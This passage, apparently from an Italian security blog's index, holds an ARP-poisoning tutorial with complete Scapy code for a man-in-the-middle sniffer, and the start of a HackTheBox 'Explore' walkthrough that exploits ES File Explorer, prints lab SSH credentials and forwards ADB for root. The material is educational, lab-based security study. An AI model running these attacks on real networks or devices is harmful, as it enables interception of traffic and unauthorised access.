un‚ÄôARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perci√≤ la comunicazione attraverso la rete locale non incontra nessun ostacolo.\nMa cosa succede se non √® il computer di destinazione ricercato a rispondere, bens√¨ un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l‚ÄôARP poisoning.\nOra che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante pu√≤ usare le falle del protocollo per i suoi scopi.\nChe cos‚Äô√® l‚ÄôARP Poisoning Lo schema request-response del protocollo ARP √® creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell‚ÄôARP spoofing, gli hacker cercano perci√≤ di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare cos√¨ la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perch√© si intende un ‚Äúavvelenamento‚Äù della cache ARP. Di solito il pacchetto comprende anche l‚Äôindirizzo MAC di un dispositivo di rete, controllato dall‚Äôhacker. Il sistema della vittima collega cos√¨ l‚ÄôIP di uscita con un indirizzo dell‚Äôhardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall‚Äôhacker, che ha cos√¨ la possibilit√† di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene cos√¨ con l‚Äôinganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bens√¨ rifiutati, l‚ÄôARP poisoning pu√≤ comportare un Denial of Service (DoS). Un‚Äôaltra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; per√≤ questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l‚Äôintenzione di accettare una risposta. √à quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.\nARP Poisoning con Scapy e Python Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.\n Disclaimer: ‚ö†Ô∏è Quello che starete per vedere √® un esempio di attacco informatico che sto svolgendo su sistemi di mia propriet√†. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione √® un illecito. ‚ö†Ô∏è\n Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.\nPer prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:\nifconfig [interface] interface dovr√† essere sostituito con il nome dell‚Äôinterfaccia di rete della macchina vittima, nel mio caso l‚Äôinterfaccia √® wlp61s0, l‚Äôoutput dovr√† essere un qualcosa simile a:\nwlp61s0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.1.22 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::bf57:5b8e:8ef6:fe0b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether b4:6b:fc:a3:63:99 txqueuelen 1000 (Ethernet) RX packets 190150 bytes 230866258 (230.8 MB) RX errors 0 dropped 2237 overruns 0 frame 0 TX packets 52365 bytes 14313727 (14.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Il comando ifconfig ci mostra la configurazione della rete per un‚Äôinterfaccia specifica (in quest‚Äôesempio √® la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.\nL‚Äôoutput mostra che l‚Äôindirizzo inet (IPv4) per il dispositivo √® 192.168.1.22. √à mostrato anche l‚Äôindirizzo mac ether che √® b4:6b:fc:a3:63:99.\nOra vediamo la cache ARP della macchina vittima, usiamo il comando:\narp -a Il risultato √® qualcosa del tipo:\nwind3.hub (192.168.1.1) associato a b8:d5:26:69:b5:dc [ether] su wlp61s0 Kobra3390.wind3.hub (192.168.1.233) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 192.168.1.233 √® l‚Äôindirizzo IP della macchina Kali, mentre 192.168.1.1 √® l‚Äôindirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell‚Äôindirizzo MAC registrato per il gateway.\nConoscendo l‚Äôindirizzo IP dell‚Äôattaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): pass class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): pass def run(self): pass def poison(self): pass def sniff(self, count=200): pass def restore(self): pass if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Come si vede, definiamo una funzione helper per ottenere l‚Äô indirizzo MAC per una determinata macchina e una classe Arper per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione get_mac che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:\ndef get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None Le passiamo l‚Äôindirizzo IP dell‚Äôobiettivo e creiamo un pacchetto. La funzione Ether specifica che il pacchetto √® concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l‚Äôindirizzo MAC collegato chiedendo a ogni nodo della rete se √® in possesso di quell‚Äôindirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy srp che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile resp che dovrebbe contenere la sorgente Ether (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe Arper:\nclass Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l‚Äôinterfaccia che vogliamo utilizzare (eth0 √® l‚Äôopzione di default). Popoliamo le variabili interne dell‚Äôoggetto con interface, victim, victimmac, gateway e gatewaymac stampandone i valori a console.\nAll‚Äôinterno della classe Arper scriviamo la funzione run che rappresenta l‚Äôentry point del nostro attacco:\ndef run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) Il metodo run esegue tutto il lavoro principale dell‚Äôoggetto Arper. Imposta ed esegue due processi:\n Il primo avvelena la cache ARP Il secondo ci permette di osservare l‚Äôevoluzione dell‚Äôattacco sniffando il traffico di rete  Il metodo poison produce i pacchetti ‚Äúavvelenati‚Äù e li invia alla vittima e al gateway:\ndef poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) Il metodo poison imposta i dati che useremo per ‚Äúavvelenare‚Äù la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP poisoned per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l‚Äôindirizzo IP della vittima ma con il MAC dell‚Äôaggressore. Facciamo poi lo stesso inviando alla vittima l‚Äôindirizzo IP del gateway ma con il MAC address dell‚Äôaggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.\nPoi iniziamo a spedire i pacchetti ‚Äúavvelenati‚Äù alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell‚Äôattacco.\nPorremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da l√¨ ripristineremo la situazione riportandola alla normalit√†, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.\nPer vedere e registrare cosa succede durante le nostre operazioni di poisoning, intercettiamo il traffico di rete con il metodo sniff:\ndef sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) Il metodo sniff resta in pausa per cinque secondi prima di iniziare lo sniffing per dare tempo al thread che esegue il vero e proprio poisoning di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l‚Äôindirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo arper.pcap, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l‚Äôattacco.\nDa ultimo, il metodo restore riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:\ndef restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) Il metodo restore potrebbe essere chiamato sia da poison (dopo un CTRL-C), sia da sniff (quando il numero di pacchetti richiesti √® stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.\nEcco il codice completo:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) def run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) self.sniff_thread.start() def poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) def sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) def restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Prima di avviare l‚Äôattacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:\nsudo echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Ora che l‚ÄôIP forwarding √® stato importato, avviamo lo script con:\nsudo python3 arper.py [IP vittima] [IP gateway] [interface] Ad esempio:\nsudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0 L‚Äôoutput durante l‚Äôattacco:\n? (192.168.1.1) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 ? (192.168.1.176) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 Si vede che la vittima malcapitata ha una cache ARP compromessa, poich√® il gateway risulta avere lo stesso indirizzo MAC dell‚Äôattaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.\nCome prevenire L\u0026rsquo;ARP Poisoning con DAI L\u0026rsquo;ispezione ARP dinamica (DAI) √® una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi. La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini. Il malintenzionato invia richieste o risposte ARP mappando l\u0026rsquo;indirizzo IP di un\u0026rsquo;altra stazione al proprio indirizzo MAC.\nDAI si basa sullo snooping DHCP. Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).\nQuando DAI √® abilitato, lo switch elimina il pacchetto ARP se l\u0026rsquo;indirizzo MAC e l\u0026rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP. Tuttavia, pu√≤ essere superato attraverso mappature statiche. I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non pu√≤ essere eseguito o altri switch nella rete non eseguono l\u0026rsquo;ispezione ARP dinamica. Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/","tags":["Protocollo ARP","ARP Poisoning","Python","Scapy","DAI"],"title":"Introduzione All'ARP Poisoning"},{"categories":["Walkthrough HackTheBox"],"contents":"Table of Contents:\n Enumerazione con Nmap Analisi delle porte  Sfruttamento dell‚ÄôExploit con Metasploit Sfruttamento dell‚ÄôExploit con CVE (Script Python)   Privilage Escalation   Explore √® una macchina Android di facile difficolt√†. L‚Äôenumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un‚Äôulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo cos√¨ l‚Äôaccesso remoto alla macchina. Infine, l‚Äôaggressore √® in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l‚ÄôAndroid Debug Bridge (ADB). Questa eventualit√† consente all‚Äôutente malintenzionato di eseguire comandi come utente root.\nEnumerazione con Nmap Eseguiamo l‚Äôenumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:\n1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) 2. nmap -p$ports -sC -sV [address] L‚Äôoutput sar√†:\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 09:58 EST Nmap scan report for explore (10.10.10.247) Host is up (0.039s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 7190e3a7c95d836634883debb4c788fb (RSA) 5555/tcp filtered freeciv 34245/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.93%I=7%D=11/29%Time=63861E0F%P=x86_64-pc-linux-gnu%r(N SF:ULL,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port34245-TCP:V=7.93%I=7%D=11/29%Time=63861E0E%P=x86_64-pc-linux-gnu%r( SF:GenericLines,AA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2 SF:029\\x20Nov\\x202022\\x2014:59:13\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n SF:\\r\\nInvalid\\x20request\\x20line:\\x20\u0026#34;)%r(GetRequest,5C,\u0026#34;HTTP/1\\.1\\x20412 SF:\\x20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014: SF:59:13\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,B5,\u0026#34;HTTP/1 SF:\\.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\ SF:x2014:59:18\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x SF:20supported:\\x20OPTIONS\u0026#34;)%r(RTSPRequest,BB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:18\\x20GMT\\r\\nCon SF:tent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\ SF:r\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version SF::\\x20\\x20RTSP/1\\.0\u0026#34;)%r(Help,AE,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length: SF:\\x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\u0026#34;)%r(SSLSessionRe SF:q,DD,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\ SF:x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid SF:\\x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\ SF:?\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?\u0026lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\u0026#34;)%r(TerminalS SF:erverCookie,CA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x20 SF:29\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mst SF:shash=nmap\u0026#34;)%r(TLSSessionReq,DB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\n SF:Date:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length SF::\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnecti SF:on:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\ SF:0e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds Analisi delle porte Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso √© 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:\nQuesto sito web mostra le assegnazioni delle porte e le vulnerabilit√† note.\nNello snippet di cui sopra possiamo vedere che la porta 5555 √® utilizzata da Android Debug Bridge (ADB). Android Debug Bridge (adb) √® uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android. Dato che la porta 5555 √® filtrata e non √® possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:\nQuesta porta √® utilizzata dall‚Äôapplicazione ES File Explorer File Manager per Android, secondo questo sito web. Questo sito web indica anche una vulnerabilit√† nota per questa applicazione, in cui un utente malintenzionato √® in grado di eseguire comandi arbitrari sull‚Äôhost. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.\nSfruttamento dell‚ÄôExploit con Metasploit La ricerca nel framework metasploit rivela un modulo per questa vulnerabilit√†:\n1. msfconsole 2. search es file explorer  Il modulo di interesse √®:\n# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Port Utilizziamo questo modulo ed elenchiamo le sue opzioni:\n1. use auxiliary/scanner/http/es_file_explorer_open_port 2. options  Successivamente, si imposta il parametro RHOSTS con l‚ÄôIP dell‚Äôhost e si digita exploit:\n1. set RHOSTS 10.10.10.247 2. exploit  Il risultato √® positivo. L‚Äôazione del parametro √® stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l‚Äôuscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.\nshow actions  Impostando l‚Äôazione su LISTPICS, si ottengono i seguenti risultati.\n1. set action LISTPICS 2. exploit  Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l‚Äôazione su GETFILE e scarichiamo il file creds.jpg:\n1. set action GETFILE 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg 3. exploit  Successivamente, possiamo aprire l‚Äôimmagine utilizzando il visualizzatore di immagini feh:\n1. sudo apt install feh 2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg Sfruttamento dell‚ÄôExploit con CVE (Script Python) Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:\nSalviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l‚Äôaccesso ai dati nel telefono cellulare dell‚Äôutente e l‚Äôesecuzione dell‚Äôapplicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l‚Äôexploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell‚Äôexploit:\npython3 [script].py --cmd GetDeviceInfo --ip [address]  Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:\npython3 [script].py listPics [address]  Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C‚Äô√® un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:\npython3 [script].py getFile [address] /storage/emulated/0/DCIM/creds.jpg  Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:\nQuesto sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l‚Äôutente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.\nssh kristi@10.10.10.247 -p 2222  La flag user.txt si trova in /storage/emulated/0/user.txt:\nPrivilage Escalation Avendo accesso all‚Äôhost remoto tramite SSH, si pu√≤ eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:\nss -ntpl Poich√© la porta 5555 √® filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:\n1. sudo apt install adb 2. adb --help Nella sezione rete vediamo che utilizzando l‚Äôistruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:\nadb connect 127.0.0.1:5555  √à possibile elencare i dispositivi collegati eseguendo il seguente comando:\nadb devices  Quindi, si pu√≤ digitare quanto segue per ottenere la shell sulla 